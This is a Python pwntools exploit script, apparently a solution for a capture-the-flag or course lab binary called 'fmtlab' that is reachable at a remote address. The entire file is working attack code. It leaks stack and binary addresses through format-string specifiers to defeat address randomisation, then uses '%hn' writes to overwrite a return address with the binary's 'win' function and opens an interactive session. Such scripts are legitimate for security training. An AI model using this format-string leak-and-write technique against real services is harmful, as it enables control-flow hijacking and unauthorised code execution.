#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'

if args.REMOTE:
    p = remote('140.112.31.97', '30104')
else:
    p = process("./fmtlab")


elf = ELF("./fmtlab")

p.sendlineafter("Your message : ", flat("%11$p.%17$p"))
leak = p.recvuntil('Y')[:-1].split('.')

elf.address = int(leak[0], 16) - 0x1080
main_rsp = int(leak[1], 16) - 0x128

for i in range(0,6,2):
    target = elf.sym.win >> (i * 8) & 0xffff
    offset = len(str(target))

    offset = (offset + 1) if i == 0 else offset
    
    payload = flat(
        ("%" + str(target + offset - 8) + "c$n%10$hn").rjust(16, '.'),
        main_rsp + 0x48 + i
    )
    p.sendlineafter("our message : ", payload)
    p.recvuntil('Y')


payload = flat(
    "%9$n....",
    main_rsp + 0xc
)

p.sendlineafter("our message : ", payload)


p.interactive()
p.close()